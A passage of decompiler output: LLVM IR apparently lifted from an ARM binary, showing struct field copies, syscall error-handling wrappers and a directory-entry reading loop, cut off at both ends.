  %v0_13f44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f44 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f44 = add i32 %v1_13f44, 48
  %v3_13f44 = inttoptr i32 %v2_13f44 to i32*
  store i32 %v0_13f44, i32* %v3_13f44, align 4
  %v0_13f48 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f48 = add i32 %v0_13f48, 72
  %v1_13f4c = inttoptr i32 %v1_13f48 to i32*
  %v2_13f4c = load i32, i32* %v1_13f4c, align 4
  %v3_13f4c = add i32 %v0_13f48, 76
  %v4_13f4c = inttoptr i32 %v3_13f4c to i32*
  %v5_13f4c = load i32, i32* %v4_13f4c, align 4
  store i32 %v5_13f4c, i32* %r1.global-to-local, align 4
  %v0_13f50 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f50 = add i32 %v0_13f50, 56
  %v1_13f54 = inttoptr i32 %v1_13f50 to i32*
  store i32 %v2_13f4c, i32* %v1_13f54, align 4
  %v3_13f54 = add i32 %v0_13f50, 60
  %v4_13f54 = inttoptr i32 %v3_13f54 to i32*
  %v5_13f54 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13f54, i32* %v4_13f54, align 4
  %v0_13f58 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f58 = add i32 %v0_13f58, 80
  %v1_13f5c = inttoptr i32 %v1_13f58 to i32*
  %v2_13f5c = load i32, i32* %v1_13f5c, align 4
  %v3_13f5c = add i32 %v0_13f58, 84
  %v4_13f5c = inttoptr i32 %v3_13f5c to i32*
  %v5_13f5c = load i32, i32* %v4_13f5c, align 4
  store i32 %v5_13f5c, i32* %r1.global-to-local, align 4
  %v0_13f60 = load i32, i32* %r6.global-to-local, align 4
  %v1_13f60 = add i32 %v0_13f60, 64
  %v1_13f64 = inttoptr i32 %v1_13f60 to i32*
  store i32 %v2_13f5c, i32* %v1_13f64, align 4
  %v3_13f64 = add i32 %v0_13f60, 68
  %v4_13f64 = inttoptr i32 %v3_13f64 to i32*
  %v5_13f64 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13f64, i32* %v4_13f64, align 4
  %v0_13f68 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f68 = add i32 %v0_13f68, 16
  %v2_13f68 = inttoptr i32 %v1_13f68 to i32*
  %v3_13f68 = load i32, i32* %v2_13f68, align 4
  %v1_13f6c = load i32, i32* %r6.global-to-local, align 4
  %v2_13f6c = add i32 %v1_13f6c, 16
  %v3_13f6c = inttoptr i32 %v2_13f6c to i32*
  store i32 %v3_13f68, i32* %v3_13f6c, align 4
  %v0_13f70 = load i32, i32* %r5.global-to-local, align 4
  %v1_13f70 = add i32 %v0_13f70, 88
  %v1_13f74 = add i32 %v0_13f70, 20
  %v2_13f74 = inttoptr i32 %v1_13f74 to i32*
  %v3_13f74 = load i32, i32* %v2_13f74, align 4
  store i32 %v3_13f74, i32* %r2.global-to-local, align 4
  %v1_13f78 = inttoptr i32 %v1_13f70 to i32*
  %v2_13f78 = load i32, i32* %v1_13f78, align 4
  %v3_13f78 = add i32 %v0_13f70, 92
  %v4_13f78 = inttoptr i32 %v3_13f78 to i32*
  %v5_13f78 = load i32, i32* %v4_13f78, align 4
  store i32 %v5_13f78, i32* %r1.global-to-local, align 4
  %v0_13f7c = load i32, i32* %r6.global-to-local, align 4
  %v1_13f7c = add i32 %v0_13f7c, 72
  %v1_13f80 = inttoptr i32 %v1_13f7c to i32*
  store i32 %v2_13f78, i32* %v1_13f80, align 4
  %v3_13f80 = add i32 %v0_13f7c, 76
  %v4_13f80 = inttoptr i32 %v3_13f80 to i32*
  %v5_13f80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13f80, i32* %v4_13f80, align 4
  %v0_13f84 = load i32, i32* %r2.global-to-local, align 4
  %v1_13f84 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f84 = add i32 %v1_13f84, 20
  %v3_13f84 = inttoptr i32 %v2_13f84 to i32*
  store i32 %v0_13f84, i32* %v3_13f84, align 4
  %v0_13f88 = load i32, i32* %ip.global-to-local, align 4
  %v1_13f88 = load i32, i32* %r6.global-to-local, align 4
  %v2_13f88 = add i32 %v1_13f88, 24
  %v3_13f88 = inttoptr i32 %v2_13f88 to i32*
  store i32 %v0_13f88, i32* %v3_13f88, align 4
  %v0_13f8c = load i32, i32* %lr.global-to-local, align 4
  %v1_13f8c = load i32, i32* %r6.global-to-local, align 4
  %v2_13f8c = add i32 %v1_13f8c, 28
  %v3_13f8c = inttoptr i32 %v2_13f8c to i32*
  store i32 %v0_13f8c, i32* %v3_13f8c, align 4
  %v2_13f90 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13f90, i32* %r4.global-to-local, align 4
  ret i32 %v2_13f78

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 84, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_13f98(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13f98:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_13fb4 = inttoptr i32 %arg2 to i8*
  %v3_13fb4 = call i32 @function_11250(i8* %v2_13fb4, i32 0)
  %v1_13fb8 = add i32 %tmp, 4
  %v2_13fb8 = inttoptr i32 %v1_13fb8 to i32*
  %v3_13fb8 = load i32, i32* %v2_13fb8, align 4
  %v2_13fbc = load i32, i32* %arg1, align 4
  store i32 %v2_13fbc, i32* %r8.global-to-local, align 4
  %v1_13fc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fc0 = add i32 %v1_13fc0, 12
  %v3_13fc0 = inttoptr i32 %v2_13fc0 to i32*
  store i32 %v3_13fb8, i32* %v3_13fc0, align 4
  %v0_13fc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fc4 = add i32 %v0_13fc4, 20
  %v2_13fc4 = inttoptr i32 %v1_13fc4 to i32*
  %v3_13fc4 = load i32, i32* %v2_13fc4, align 4
  %v1_13fc8 = add i32 %v0_13fc4, 16
  %v2_13fc8 = inttoptr i32 %v1_13fc8 to i32*
  %v3_13fc8 = load i32, i32* %v2_13fc8, align 4
  store i32 %v3_13fc8, i32* %r6.global-to-local, align 4
  %v1_13fcc = load i32, i32* %r5.global-to-local, align 4
  %v2_13fcc = add i32 %v1_13fcc, 44
  %v3_13fcc = inttoptr i32 %v2_13fcc to i32*
  store i32 %v3_13fc4, i32* %v3_13fcc, align 4
  %v0_13fd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fd0 = add i32 %v0_13fd0, 24
  %v2_13fd0 = inttoptr i32 %v1_13fd0 to i32*
  %v3_13fd0 = load i32, i32* %v2_13fd0, align 4
  %v1_13fd4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fd4 = add i32 %v1_13fd4, 48
  %v3_13fd4 = inttoptr i32 %v2_13fd4 to i32*
  store i32 %v3_13fd0, i32* %v3_13fd4, align 4
  %v0_13fd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fd8 = add i32 %v0_13fd8, 28
  %v2_13fd8 = inttoptr i32 %v1_13fd8 to i32*
  %v3_13fd8 = load i32, i32* %v2_13fd8, align 4
  %v1_13fdc = load i32, i32* %r5.global-to-local, align 4
  %v2_13fdc = add i32 %v1_13fdc, 52
  %v3_13fdc = inttoptr i32 %v2_13fdc to i32*
  store i32 %v3_13fd8, i32* %v3_13fdc, align 4
  %v0_13fe0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fe0 = add i32 %v0_13fe0, 32
  %v1_13fe4 = inttoptr i32 %v1_13fe0 to i32*
  %v2_13fe4 = load i32, i32* %v1_13fe4, align 4
  %v3_13fe4 = add i32 %v0_13fe0, 36
  %v4_13fe4 = inttoptr i32 %v3_13fe4 to i32*
  %v5_13fe4 = load i32, i32* %v4_13fe4, align 4
  store i32 %v5_13fe4, i32* %r1.global-to-local, align 4
  %v0_13fe8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13fe8 = add i32 %v0_13fe8, 56
  %v1_13fec = inttoptr i32 %v1_13fe8 to i32*
  store i32 %v2_13fe4, i32* %v1_13fec, align 4
  %v3_13fec = add i32 %v0_13fe8, 60
  %v4_13fec = inttoptr i32 %v3_13fec to i32*
  %v5_13fec = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13fec, i32* %v4_13fec, align 4
  %v0_13ff0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ff0 = add i32 %v0_13ff0, 40
  %v1_13ff4 = inttoptr i32 %v1_13ff0 to i32*
  %v2_13ff4 = load i32, i32* %v1_13ff4, align 4
  %v3_13ff4 = add i32 %v0_13ff0, 44
  %v4_13ff4 = inttoptr i32 %v3_13ff4 to i32*
  %v5_13ff4 = load i32, i32* %v4_13ff4, align 4
  store i32 %v5_13ff4, i32* %r1.global-to-local, align 4
  %v0_13ff8 = load i32, i32* %r5.global-to-local, align 4
  %v1_13ff8 = add i32 %v0_13ff8, 64
  %v1_13ffc = inttoptr i32 %v1_13ff8 to i32*
  store i32 %v2_13ff4, i32* %v1_13ffc, align 4
  %v3_13ffc = add i32 %v0_13ff8, 68
  %v4_13ffc = inttoptr i32 %v3_13ffc to i32*
  %v5_13ffc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_13ffc, i32* %v4_13ffc, align 4
  %v0_14000 = load i32, i32* %r4.global-to-local, align 4
  %v1_14000 = add i32 %v0_14000, 48
  %v1_14004 = inttoptr i32 %v1_14000 to i32*
  %v2_14004 = load i32, i32* %v1_14004, align 4
  %v3_14004 = add i32 %v0_14000, 52
  %v4_14004 = inttoptr i32 %v3_14004 to i32*
  %v5_14004 = load i32, i32* %v4_14004, align 4
  store i32 %v5_14004, i32* %r1.global-to-local, align 4
  %v1_14008 = add i32 %v0_14000, 8
  %v2_14008 = inttoptr i32 %v1_14008 to i16*
  %v3_14008 = load i16, i16* %v2_14008, align 2
  %v4_14008 = zext i16 %v3_14008 to i32
  store i32 %v4_14008, i32* %r2.global-to-local, align 4
  %v1_1400c = add i32 %v0_14000, 10
  %v2_1400c = inttoptr i32 %v1_1400c to i16*
  %v3_1400c = load i16, i16* %v2_1400c, align 2
  %v4_1400c = zext i16 %v3_1400c to i32
  store i32 %v4_1400c, i32* %ip.global-to-local, align 4
  %v1_14010 = add i32 %v0_14000, 12
  %v2_14010 = inttoptr i32 %v1_14010 to i16*
  %v3_14010 = load i16, i16* %v2_14010, align 2
  %v4_14010 = zext i16 %v3_14010 to i32
  store i32 %v4_14010, i32* %lr.global-to-local, align 4
  %v1_14014 = add i32 %v0_14000, 14
  %v2_14014 = inttoptr i32 %v1_14014 to i16*
  %v3_14014 = load i16, i16* %v2_14014, align 2
  %v4_14014 = zext i16 %v3_14014 to i32
  store i32 %v4_14014, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_14020 = load i32, i32* %r5.global-to-local, align 4
  %v1_14020 = add i32 %v0_14020, 72
  %v1_14024 = inttoptr i32 %v1_14020 to i32*
  store i32 %v2_14004, i32* %v1_14024, align 4
  %v3_14024 = add i32 %v0_14020, 76
  %v4_14024 = inttoptr i32 %v3_14024 to i32*
  %v5_14024 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14024, i32* %v4_14024, align 4
  %v0_14028 = load i32, i32* %r5.global-to-local, align 4
  %v1_14028 = inttoptr i32 %v0_14028 to i32*
  %v2_14028 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_14028, i32* %v1_14028, align 4
  %v3_14028 = add i32 %v0_14028, 4
  %v4_14028 = inttoptr i32 %v3_14028 to i32*
  %v5_14028 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_14028, i32* %v4_14028, align 4
  %v0_1402c = load i32, i32* %r6.global-to-local, align 4
  %v1_1402c = load i32, i32* %r5.global-to-local, align 4
  %v2_1402c = add i32 %v1_1402c, 32
  %v3_1402c = inttoptr i32 %v2_1402c to i32*
  store i32 %v0_1402c, i32* %v3_1402c, align 4
  %v0_14030 = load i32, i32* %r7.global-to-local, align 4
  %v1_14030 = load i32, i32* %r5.global-to-local, align 4
  %v2_14030 = add i32 %v1_14030, 36
  %v3_14030 = inttoptr i32 %v2_14030 to i32*
  store i32 %v0_14030, i32* %v3_14030, align 4
  %v0_14034 = load i32, i32* %r2.global-to-local, align 4
  %v1_14034 = load i32, i32* %r5.global-to-local, align 4
  %v2_14034 = add i32 %v1_14034, 16
  %v3_14034 = inttoptr i32 %v2_14034 to i32*
  store i32 %v0_14034, i32* %v3_14034, align 4
  %v0_14038 = load i32, i32* %ip.global-to-local, align 4
  %v1_14038 = load i32, i32* %r5.global-to-local, align 4
  %v2_14038 = add i32 %v1_14038, 20
  %v3_14038 = inttoptr i32 %v2_14038 to i32*
  store i32 %v0_14038, i32* %v3_14038, align 4
  %v0_1403c = load i32, i32* %lr.global-to-local, align 4
  %v1_1403c = load i32, i32* %r5.global-to-local, align 4
  %v2_1403c = add i32 %v1_1403c, 24
  %v3_1403c = inttoptr i32 %v2_1403c to i32*
  store i32 %v0_1403c, i32* %v3_1403c, align 4
  %v0_14040 = load i32, i32* %r4.global-to-local, align 4
  %v1_14040 = load i32, i32* %r5.global-to-local, align 4
  %v2_14040 = add i32 %v1_14040, 28
  %v3_14040 = inttoptr i32 %v2_14040 to i32*
  store i32 %v0_14040, i32* %v3_14040, align 4
  ret i32 %v2_14004

; uselistorder directives
  uselistorder i32 %v0_14000, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 76, { 1, 2, 3, 4, 0 }
  uselistorder i32 68, { 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 60, { 3, 4, 1, 5, 6, 0, 2, 7 }
  uselistorder i32 88, { 4, 0, 1, 2, 3 }
}

define i32 @function_14050() local_unnamed_addr {
dec_label_pc_14050:
  %stack_var_-16 = alloca i32, align 4
  %v2_14054 = ptrtoint i32* %stack_var_-16 to i32
  %v2_14060 = call i32 @function_15d88(i32 7, i32 %v2_14054)
  %v1_14064 = icmp slt i32 %v2_14060, 0
  %v5_14068 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14064, i32 256, i32 %v5_14068
  ret i32 %storemerge
}

define i32 @function_1407c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1407c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1407c = load i32, i32* @r7, align 4
  store i32 %v3_1407c, i32* %stack_var_-8, align 4
  %v0_14088 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14088, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14088, -4095
  br i1 %tmp, label %dec_label_pc_140a8, label %dec_label_pc_14098

dec_label_pc_14098:                               ; preds = %dec_label_pc_1407c
  %v0_14098 = call i32 @function_11200()
  %v0_1409c = load i32, i32* %r7.global-to-local, align 4
  %v1_1409c = sub i32 0, %v0_1409c
  %v2_140a0 = inttoptr i32 %v0_14098 to i32*
  store i32 %v1_1409c, i32* %v2_140a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140a8

dec_label_pc_140a8:                               ; preds = %dec_label_pc_1407c, %dec_label_pc_14098
  %v1_140ac = phi i32 [ %v0_14088, %dec_label_pc_1407c ], [ -1, %dec_label_pc_14098 ]
  %v2_140a8 = phi i32 [ %v3_1407c, %dec_label_pc_1407c ], [ %v2_140a8.pre, %dec_label_pc_14098 ]
  store i32 %v2_140a8, i32* @r7, align 4
  ret i32 %v1_140ac

; uselistorder directives
  uselistorder i32 %v0_14088, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140a8, { 1, 0 }
}

define i32 @function_140b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_140b0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140b0 = load i32, i32* @r7, align 4
  store i32 %v3_140b0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_140d8, label %dec_label_pc_140c8

dec_label_pc_140c8:                               ; preds = %dec_label_pc_140b0
  %v0_140c8 = call i32 @function_11200()
  %v0_140cc = load i32, i32* %r7.global-to-local, align 4
  %v1_140cc = sub i32 0, %v0_140cc
  %v2_140d0 = inttoptr i32 %v0_140c8 to i32*
  store i32 %v1_140cc, i32* %v2_140d0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_140dc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140d8

dec_label_pc_140d8:                               ; preds = %dec_label_pc_140b0, %dec_label_pc_140c8
  %v2_140dc = phi i32 [ %v3_140b0, %dec_label_pc_140b0 ], [ %v2_140dc.pre, %dec_label_pc_140c8 ]
  %v0_140d8 = phi i32 [ %arg1, %dec_label_pc_140b0 ], [ -1, %dec_label_pc_140c8 ]
  store i32 %v2_140dc, i32* @r7, align 4
  ret i32 %v0_140d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_140d8, { 1, 0 }
}

define i32 @function_140e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_140e4:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14118, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %dec_label_pc_140e4
  %v0_14108 = call i32 @function_11200()
  %v0_1410c = load i32, i32* %r4.global-to-local, align 4
  %v1_1410c = sub i32 0, %v0_1410c
  %v2_14110 = inttoptr i32 %v0_14108 to i32*
  store i32 %v1_1410c, i32* %v2_14110, align 4
  br label %dec_label_pc_14118

dec_label_pc_14118:                               ; preds = %dec_label_pc_140e4, %dec_label_pc_14108
  %v1_14120 = phi i32 [ %arg1, %dec_label_pc_140e4 ], [ -1, %dec_label_pc_14108 ]
  ret i32 %v1_14120

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14118, { 1, 0 }
}

define i32 @function_14124(i32 %arg1) local_unnamed_addr {
dec_label_pc_14124:
  %v1_14134 = load i32, i32* @r0, align 4
  ret i32 %v1_14134
}

define i32 @function_14138(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14138:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14138 = load i32, i32* @r7, align 4
  store i32 %v3_14138, i32* %stack_var_-8, align 4
  %v0_14144 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14144, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14144, -4095
  br i1 %tmp, label %dec_label_pc_14164, label %dec_label_pc_14154

dec_label_pc_14154:                               ; preds = %dec_label_pc_14138
  %v0_14154 = call i32 @function_11200()
  %v0_14158 = load i32, i32* %r7.global-to-local, align 4
  %v1_14158 = sub i32 0, %v0_14158
  %v2_1415c = inttoptr i32 %v0_14154 to i32*
  store i32 %v1_14158, i32* %v2_1415c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14164.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14164

dec_label_pc_14164:                               ; preds = %dec_label_pc_14138, %dec_label_pc_14154
  %v1_14168 = phi i32 [ %v0_14144, %dec_label_pc_14138 ], [ -1, %dec_label_pc_14154 ]
  %v2_14164 = phi i32 [ %v3_14138, %dec_label_pc_14138 ], [ %v2_14164.pre, %dec_label_pc_14154 ]
  store i32 %v2_14164, i32* @r7, align 4
  ret i32 %v1_14168

; uselistorder directives
  uselistorder i32 %v0_14144, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14164, { 1, 0 }
}

define i32 @function_1416c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1416c:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14170.outer

dec_label_pc_14170.outer:                         ; preds = %dec_label_pc_14188, %dec_label_pc_1416c
  %v0_14170.ph = phi i32 [ %v0_14170.pre.pre, %dec_label_pc_14188 ], [ %arg1, %dec_label_pc_1416c ]
  %tmp = icmp ult i32 %v0_14170.ph, -4095
  br label %dec_label_pc_14170

dec_label_pc_14170:                               ; preds = %dec_label_pc_14170.outer, %dec_label_pc_14170
  br i1 %tmp, label %dec_label_pc_14170, label %dec_label_pc_14188

dec_label_pc_14188:                               ; preds = %dec_label_pc_14170
  %v0_14188 = call i32 @function_11200()
  %v1_1418c = sub i32 0, %v0_14170.ph
  %v2_14190 = inttoptr i32 %v0_14188 to i32*
  store i32 %v1_1418c, i32* %v2_14190, align 4
  %v0_14170.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14170.outer

; uselistorder directives
  uselistorder i32 %v0_14170.ph, { 1, 0 }
  uselistorder label %dec_label_pc_14170, { 1, 0 }
}

define i32 @function_14198(i32* %arg1) local_unnamed_addr {
dec_label_pc_14198:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 124804, i32* @r6, align 4
  %v1_141ac = add i32 %tmp, 24
  store i32 %v1_141ac, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_141c4 = load i32, i32* inttoptr (i32 124876 to i32*), align 4
  store i32 %v4_141c4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_141c4)
  %v0_141d8 = load i32, i32* @r6, align 4
  %v2_141d8 = add i32 %v0_141d8, 16
  %v3_141d8 = inttoptr i32 %v2_141d8 to i32*
  %v4_141d8 = load i32, i32* %v3_141d8, align 4
  store i32 %v4_141d8, i32* %ip.global-to-local, align 4
  store i32 82404, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_141d8)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_141e8

dec_label_pc_141e8:                               ; preds = %dec_label_pc_14218, %dec_label_pc_14198
  %v0_141e8 = load i32, i32* @r5, align 4
  %v1_141e8 = add i32 %v0_141e8, 4
  %v2_141e8 = inttoptr i32 %v1_141e8 to i32*
  %v3_141e8 = load i32, i32* %v2_141e8, align 4
  %v4_141e8 = add i32 %v0_141e8, 8
  %v5_141e8 = inttoptr i32 %v4_141e8 to i32*
  %v6_141e8 = load i32, i32* %v5_141e8, align 4
  %tmp10 = icmp ugt i32 %v6_141e8, %v3_141e8
  br i1 %tmp10, label %dec_label_pc_14218, label %dec_label_pc_141f4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141e8
  %v1_141f4 = inttoptr i32 %v0_141e8 to i32*
  %v2_141f4 = load i32, i32* %v1_141f4, align 4
  %v1_141f8 = add i32 %v0_141e8, 12
  %v2_141f8 = inttoptr i32 %v1_141f8 to i32*
  %v3_141f8 = load i32, i32* %v2_141f8, align 4
  %v1_141fc = add i32 %v0_141e8, 20
  %v2_141fc = inttoptr i32 %v1_141fc to i32*
  %v3_141fc = load i32, i32* %v2_141fc, align 4
  %v4_14200 = inttoptr i32 %v3_141f8 to i32*
  %v5_14200 = call i32 @function_15dbc(i32 %v2_141f4, i32* %v4_14200, i32 %v3_141fc, i32 %v6_141e8)
  %tmp9 = icmp slt i32 %v5_14200, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_14210

.thread:                                          ; preds = %dec_label_pc_141f4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14248

dec_label_pc_14210:                               ; preds = %dec_label_pc_141f4
  %v1_14210 = load i32, i32* @r5, align 4
  %v2_14210 = add i32 %v1_14210, 8
  %v3_14210 = inttoptr i32 %v2_14210 to i32*
  store i32 %v5_14200, i32* %v3_14210, align 4
  %v0_14214 = load i32, i32* @r7, align 4
  %v1_14214 = load i32, i32* @r5, align 4
  %v2_14214 = add i32 %v1_14214, 4
  %v3_14214 = inttoptr i32 %v2_14214 to i32*
  store i32 %v0_14214, i32* %v3_14214, align 4
  %v0_14218.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14218

dec_label_pc_14218:                               ; preds = %dec_label_pc_141e8, %dec_label_pc_14210
  %v1_1423c = phi i32 [ %v0_141e8, %dec_label_pc_141e8 ], [ %v0_14218.pre, %dec_label_pc_14210 ]
  %v1_14218 = add i32 %v1_1423c, 4
  %v2_14218 = inttoptr i32 %v1_14218 to i32*
  %v3_14218 = load i32, i32* %v2_14218, align 4
  %v1_1421c = add i32 %v1_1423c, 12
  %v2_1421c = inttoptr i32 %v1_1421c to i32*
  %v3_1421c = load i32, i32* %v2_1421c, align 4
  %v2_14220 = add i32 %v3_1421c, %v3_14218
  store i32 %v2_14220, i32* @r4, align 4
  %v3_14224 = inttoptr i32 %v2_14220 to i32*
  %v4_14224 = load i32, i32* %v3_14224, align 4
  %v1_14228 = add i32 %v2_14220, 4
  %v2_14228 = inttoptr i32 %v1_14228 to i32*
  %v3_14228 = load i32, i32* %v2_14228, align 4
  %v1_1422c = add i32 %v2_14220, 16
  %v2_1422c = inttoptr i32 %v1_1422c to i16*
  %v3_1422c = load i16, i16* %v2_1422c, align 2
  %v4_1422c = zext i16 %v3_1422c to i32
  %v1_14230 = add i32 %v2_14220, 8
  %v2_14230 = inttoptr i32 %v1_14230 to i32*
  %v3_14230 = load i32, i32* %v2_14230, align 4
  store i32 %v3_14230, i32* %ip.global-to-local, align 4
  %v2_14234 = add i32 %v4_1422c, %v3_14218
  %v2_14238 = or i32 %v3_14228, %v4_14224
  %v4_14238 = icmp eq i32 %v2_14238, 0
  store i32 %v2_14234, i32* %v2_14218, align 4
  %v0_14240 = load i32, i32* %ip.global-to-local, align 4
  %v1_14240 = load i32, i32* @r5, align 4
  %v2_14240 = add i32 %v1_14240, 16
  %v3_14240 = inttoptr i32 %v2_14240 to i32*
  store i32 %v0_14240, i32* %v3_14240, align 4
  br i1 %v4_14238, label %dec_label_pc_141e8, label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %dec_label_pc_14218, %.thread
  %v0_14254 = load i32, i32* @r6, align 4
  %v2_14254 = add i32 %v0_14254, 24
  %v3_14254 = inttoptr i32 %v2_14254 to i32*
  %v4_14254 = load i32, i32* %v3_14254, align 4
  store i32 %v4_14254, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14254)
  %v0_14260 = load i32, i32* @r4, align 4
  ret i32 %v0_14260

; uselistorder directives
  uselistorder i32 %v2_14220, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1423c, { 1, 0 }
  uselistorder i32 %v6_141e8, { 1, 0 }
  uselistorder i32 %v0_141e8, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_14218, { 1, 0 }
}

define i32 @function_14274(i32 %arg1) local_unnamed_addr {
dec_label_pc_14274:
  %v0_14274 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14274, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14274
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14274, %bb
  %v10_14280 = phi i32 [ %arg1, %dec_label_pc_14274 ], [ 0, %bb ]
  ret i32 %v10_14280

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14284(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14284:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_14284 = load i32, i32* @r4, align 4
  %v6_14284 = load i32, i32* @r5, align 4
  %v9_14284 = load i32, i32* @r6, align 4
  %v12_14284 = load i32, i32* @r7, align 4
  %v15_14284 = load i32, i32* @r8, align 4
  %v18_14284 = load i32, i32* @sb, align 4
  %v21_14284 = load i32, i32* @sl, align 4
  %v24_14284 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14288 = icmp eq i32* %arg1, null
  store i1 %v2_14288, i1* %cpsr_z.global-to-local, align 1
